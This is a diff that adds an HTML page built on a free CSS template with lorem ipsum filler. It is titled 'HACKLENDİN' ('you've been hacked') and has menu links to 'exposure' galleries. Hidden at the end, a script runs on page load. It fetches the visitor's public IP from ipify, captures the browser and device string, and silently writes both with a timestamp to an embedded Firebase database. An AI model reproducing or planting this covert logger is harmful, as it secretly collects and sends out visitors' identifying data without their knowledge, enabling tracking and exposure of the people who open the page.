@@ -1,0 +1,119 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!--
+Design by Free CSS Templates
+http://www.freecsstemplates.org
+Released for free under a Creative Commons Attribution 2.5 License
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>HACKLENDİN</title>
+    <meta name="Keywords" content="" />
+    <meta name="Description" content="" />
+    <link href="default.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+    <div id="header">
+        <h1>HİOMER</h1>
+    </div>
+    <div id="menu">
+        <ul>
+            <li class="active"><a href="#" accesskey="1" title="">Anasayfa</a></li>
+            <li><a href="#" accesskey="1" title="">Hakkımızda</a></li>
+            <li><a href="#" accesskey="1" title="">Galeri İfşa</a></li>
+            <li><a href="#" accesskey="1" title="">Favori İfşa</a></li>
+            <li><a href="#" accesskey="1" title="">İletişim</a></li>
+        </ul>
+    </div>
+    <div id="content">
+
+        <div id="colTwo">
+            <h2>Welcome to My Website</h2>
+            <p class="byline">Posted in <a href="#">Uncategorized</a> by Farmer on the December 6th, 2006</p>
+            <p><strong>The Barn</strong> is a free template from <a href="http://www.freecsstemplates.org/">Free CSS Templates</a> released under a <a href="http://creativecommons.org/licenses/by/2.5/">Creative Commons Attribution 2.5 License</a>. The header
+                photo is from <a href="http://www.pdphoto.org/">PDPhoto.org</a>. You're free to use this template for both commercial or personal use. I only ask that you link back to <a href="http://www.freecsstemplates.org/">my site</a> in some way.</p>
+            <p><strong><em>Enjoy! :)</em></strong></p>
+            <h3>Lorem Ipsum Dolorem</h3>
+            <p class="byline">Posted in <a href="#">Uncategorized</a> by Farmer on the December 6th, 200 </p>
+            <p><img src="images/img6.jpg" alt="" width="102" height="102" class="image" /></p>
+            <p>Sed tempus turpis vel quam molestie pulvinar. Suspendisse venenatis dolor semper ipsum. Quisque tempus erat ac mi. Aliquam semper, est nec hendrerit dignissim, ligula turpis sagittis purus, ut viverra velit eros at augue. Pellentesque mi nisi,
+                porta eget, pharetra ac, sollicitudin sit amet, nisi. In sapien ligula lorem sollicitudin facilisis, sodales eget, tempus in, mauris. Cras risus sem, adipiscing non, convallis ac, consectetuer eu, dolor. In quam lorem ipsum dolor sit amet.
+                Curabitur tempus aliquam nulla. Etiam eros.</p>
+        </div>
+        <div style="clear: both;">&nbsp;</div>
+    </div>
+    <div id="footer">
+        <p>Copyright (c) 2006 Sitename.com. All Rights Reserved. Design by <a href="http://www.freecsstemplates.org/">Free CSS Templates</a>.</p>
+    </div>
+    <p id="tarayici" style="display: none;"></p>
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+
+    <!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-analytics.js"></script>
+
+    <script>
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        var firebaseConfig = {
+            apiKey: "AIzaSyD7IUEGpn8yw_MTGD2plVo1fKj-u4mF7Xg",
+            authDomain: "deneme-682d8.firebaseapp.com",
+            databaseURL: "https://deneme-682d8-default-rtdb.firebaseio.com",
+            projectId: "deneme-682d8",
+            storageBucket: "deneme-682d8.appspot.com",
+            messagingSenderId: "655746112825",
+            appId: "1:655746112825:web:17e40a98a63bbabb111ce8",
+            measurementId: "G-VJ1YWRL694"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        firebase.analytics();
+    </script>
+
+    <script>
+        var xml = new XMLHttpRequest();
+        xml.open("GET", "https://api.ipify.org")
+        xml.send();
+        xml.addEventListener("loadend", loaded);
+
+
+
+
+        function loaded(e) {
+            on(xml.responseText);
+
+
+        }
+
+        function on(ip) {
+            var num = 0;
+            firebase.database().ref("Ip").once("value").then(function(snap) {
+                var ç = document.getElementById('tarayici').innerHTML = (navigator.appName) + (navigator.appVersion);
+                var today = new Date();
+                var dd = String(today.getDate()).padStart(2, '0');
+                var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
+                var yyyy = today.getFullYear();
+                today = mm + '/' + dd + '/' + yyyy;
+                var dt = new Date(); // DATE() ile yeni bir tarih nesnesi oluşturuldu.
+                var saat = dt.getHours();
+                var dakika = dt.getMinutes();
+                var saniye = dt.getSeconds();
+                num = snap.numChildren();
+                num++;
+                firebase.database().ref("Ip").child(num.toString()).set({
+                    Ip: ip,
+                    createdDate: today + dt,
+                    Cihaz: ç
+
+                });
+            });
+        }
+    </script>
+
+</body>
+
+</html>
